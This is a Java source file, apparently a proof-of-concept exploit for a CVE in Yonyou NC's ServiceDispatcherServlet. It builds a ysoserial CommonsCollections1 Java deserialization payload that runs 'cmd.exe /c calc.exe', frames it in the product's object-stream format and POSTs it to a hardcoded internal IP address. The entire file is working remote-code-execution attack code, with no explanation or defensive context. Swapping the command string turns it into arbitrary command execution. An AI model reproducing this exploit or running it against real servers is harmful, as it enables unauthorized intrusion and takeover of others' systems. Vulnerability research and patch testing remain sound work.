package cve;

import utils.HttpUtils;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpHeaders;
import nc.bs.framework.comn.NetObjectOutputStream;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;

public class exp {

    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201:8088/ServiceDispatcherServlet";
        String gadget = "CommonsCollections1";
        String cmd = "cmd.exe /c calc.exe";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ByteArrayOutputStream temp = NetObjectOutputStream.convertObjectToBytes(obj, true, true);
        NetObjectOutputStream.writeInt(bos,temp.toByteArray().length);
        temp.writeTo(bos);

        HttpHeaders headers = new DefaultHttpHeaders();
        HttpUtils httpUtils = new HttpUtils();
        httpUtils.post(url,bos.toByteArray(),headers);
        System.exit(0);

    }
}


